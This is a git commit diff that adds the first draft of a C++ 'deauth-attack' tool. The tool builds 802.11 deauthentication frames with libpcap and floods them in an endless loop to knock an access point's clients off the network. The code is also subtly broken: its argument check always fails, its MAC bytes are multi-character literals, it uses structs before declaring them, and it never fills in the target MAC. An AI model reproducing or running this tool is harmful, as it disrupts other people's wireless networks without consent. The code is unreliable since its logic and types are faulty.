6ca832c59adc5dbc8b9dbc8bfb78fd5d226a3775
platinouss <platinouss@gmail.com>
2022-02-04 17:35:17 +0900

    commit

--- header.h
+++ header.h
@@ -1,7 +1,32 @@
 #include <pcap.h>
 #include <libnet.h>
 
+#define RADIOTAP_LEN 12
+#define MAC_ADDR_LEN 6
+
 #ifndef HEADER_H
 #define HEADER_H
+
+struct Deauth_packet final {
+    Radiotap rtap;
+    Deaut_frame d_frame;
+    Fixed_param fixed_param;
+};
+
+struct Radiotap {
+    u_char radio_tap[RADIOTAP_LEN] = { };
+};
+
+struct Deaut_frame {
+    uint16_t type = 0x000c;
+    uint16_t duration = 0;
+    u_char recv_dst_addr[MAC_ADDR_LEN] = { 'FF', 'FF', 'FF', 'FF', 'FF', 'FF'};
+    u_char trans_src_bssid_addr[MAC_ADDR_LEN];
+    uint16_t frag_sequence_num = 0x1000;
+};
+
+struct Fixed_param {
+    uint16_t reason_code = 0x0007;
+};
 
 #endif // HEADER_H
--- main.cpp
+++ main.cpp
@@ -4,7 +4,54 @@
 #include <stdio.h>
 #include <header.h>
 
+void usage()
+{
+    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << std::endl;
+    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
+}
+
+struct Param {
+	bool auth{false};
+
+	bool parse(int argc, char* argv[]) {
+		for (int i = 1; i < argc; i++) {
+			if (strcmp(argv[i], "-auth") == 0) {
+				auth = true;
+				continue;
+			}
+		}
+	}
+} param;
+
 int main(int argc, char *argv[])
 {
+    if(argc != 4 || argc != 5) {
+        usage();
+        return 0;
+    }
+
+    char* interface = argv[1];
+    char* ap_mac = argv[2];
+    char* sta_mac = argv[3];
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+            fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
+            return -1;
+    }
+
+    Deauth_packet packet;
+
+    while(true) {
+        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(Deauth_packet));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }
+        sleep(1);
+    }
+
+    pcap_close(handle);
+
     return 0;
 }
